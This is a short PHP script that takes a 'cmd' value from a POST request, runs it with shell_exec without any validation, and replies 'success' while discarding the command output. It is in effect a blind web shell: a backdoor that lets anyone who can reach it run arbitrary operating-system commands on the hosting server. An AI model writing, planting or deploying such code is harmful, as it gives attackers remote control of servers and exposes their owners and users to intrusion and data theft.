<?php
function execute($com)
{
    shell_exec($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);

$buffer = ob_get_contents();
echo "success";
ob_end_clean();
?>